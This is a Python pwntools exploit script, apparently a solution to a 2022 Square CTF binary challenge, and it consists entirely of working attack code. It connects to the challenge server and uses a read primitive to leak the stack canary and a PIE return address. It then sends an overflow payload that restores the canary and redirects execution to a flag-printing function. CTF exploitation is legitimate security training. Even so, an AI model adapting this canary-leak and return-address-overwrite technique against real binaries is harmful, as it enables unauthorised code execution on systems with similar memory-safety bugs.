from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h", "-F" "#{pane_pid}", "-P"]
# p = process("./ez-pwn-2")
p = remote("chals.2022.squarectf.com", 4101)
ru = lambda a: p.readuntil(a)
r = lambda n: p.read(n)
sla = lambda a, b: p.sendlineafter(a, b)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
s = lambda a: p.send(a)


def pack(buf):
    addr = ""
    for i in reversed(range(2, len(buf) + 1, 2)):
        addr += buf[i - 2 : i]
    # print(addr)
    return addr


def leak(offset):
    ru("here: ")
    buf = r(16).decode().strip()[2:]
    target = str(hex(int(buf, 16) + offset))
    info("leaking: " + target)
    ru("bytes:\n")
    sl(pack(target))
    p.recvline()
    return r(16).decode().strip()


# gdb.attach(p)

canary_offset = 24
ret_offset = 40

canary = leak(canary_offset)
canary = pack(canary)
canary = int(canary, 16)
log.info("canary leak: " + str(hex(canary)))

pie = leak(ret_offset)
pie = pack(pie)
pie = int(pie, 16)
log.info("PIE leak: " + str(hex(pie)))
log.info("main: " + str(hex(pie - 26)))

flag = pie - 26 - 0x110
log.info("Print flag: " + str(hex(flag)))

ru("leaked bytes:\n")
sl(
    pack(str(hex(flag))[2:]).encode()
    + b"0" * 4
    + b"A" * 8
    + p64(canary)
    + b"A" * 8
    + p64(flag)
)

p.interactive()
